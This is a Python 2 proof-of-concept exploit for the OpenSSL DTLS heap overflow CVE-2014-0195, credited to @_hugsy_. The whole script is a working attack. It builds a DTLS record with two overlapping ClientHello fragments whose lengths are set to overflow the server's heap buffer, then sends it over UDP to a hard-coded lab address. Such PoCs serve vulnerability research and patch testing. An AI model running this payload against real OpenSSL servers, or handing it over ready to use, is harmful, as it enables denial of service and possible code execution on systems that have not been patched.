#!/usr/bin/env python2
#
# OpenSSL heap overflow PoC
# Found by ZDI - ZDI-14-173 // CVE-2014-0195
# PoC by @_hugsy_
#
# Ref: https://tools.ietf.org/html/rfc6347
#

import socket, struct


HOST = "192.168.56.102"
PORT = 1337

DTLS_HANDSHAKE = 0x16
DTLS_CLIENTHELLO = 0x01
VERSION = 0xfeff

SIZE1 = 16
handshake_frag1  = chr(DTLS_CLIENTHELLO)
handshake_frag1 += "\x00" + struct.pack(">H", SIZE1) # uint24 length;
handshake_frag1 += "\x00\x00" # uint16 message_seq;
handshake_frag1 += "\x00\x00\x00" # uint24 fragment_offset;
handshake_frag1 += "\x00" + struct.pack(">H", SIZE1-1) # uint24 fragment_length;
handshake_frag1 += "A"*(SIZE1-1)

SIZE2 = 4098
handshake_frag2  = chr(DTLS_CLIENTHELLO)
handshake_frag2 += "\x00" + struct.pack(">H", SIZE2) # uint24 length;
handshake_frag2 += "\x00\x00" # uint16 message_seq;
handshake_frag2 += "\x00\x00\x00" # uint24 fragment_offset;
handshake_frag2 += "\x00" + struct.pack(">H", SIZE2-1)  # uint24 fragment_length;
handshake_frag2 += "B"*(SIZE2-1)

record_msg  = chr(DTLS_HANDSHAKE) # ContentType type;
record_msg += struct.pack(">H", VERSION) # ProtocolVersion version;
record_msg += struct.pack(">H", 0x00) # uint16 epoch
record_msg += "\x00"*6 # uint48 sequence_number;
record_msg += struct.pack(">H", len(handshake_frag1 + handshake_frag2)) # uint16 length;

data = record_msg + handshake_frag1 + handshake_frag2
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(data, (HOST, PORT))
sock.close()
